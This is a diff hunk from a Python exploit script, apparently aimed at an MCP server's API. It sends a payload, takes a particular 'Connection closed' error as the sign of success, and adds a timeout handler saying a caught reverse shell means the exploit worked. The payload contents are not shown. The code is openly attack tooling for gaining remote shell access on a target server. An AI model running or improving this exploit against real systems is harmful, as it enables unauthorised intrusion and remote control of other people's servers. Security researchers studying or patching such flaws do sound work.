@@ -52,12 +52,14 @@ def exploit(args):
             "serverId": "test"
         }
         with Status('Performing exploitation...', spinner='aesthetic', console=console):
-            r = requests.post(api_endpoint, headers=headers, json=payload)
+            r = requests.post(api_endpoint, headers=headers, json=payload, timeout=5)
         success_message = '{"success":false,"error":"Connection failed for server test: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}'
         if r.status_code == 500 and r.text == success_message:
             console.print(f"[[green]+[/green]] Exploitation completed!\n")
         else:
             console.print(f"[[red]-[/red]] Exploitation failed.\n")
+    except requests.exceptions.Timeout:
+        console.print(f"[[blue]#[/blue]] If you gathered a reverse shell, the exploit succeded.\n[[blue]#[/blue]] Otherwise, the request just timed out.\n")
     except Exception as e:
         console.print(f"[[red]-[/red]] Exploitation failed.\n")
 
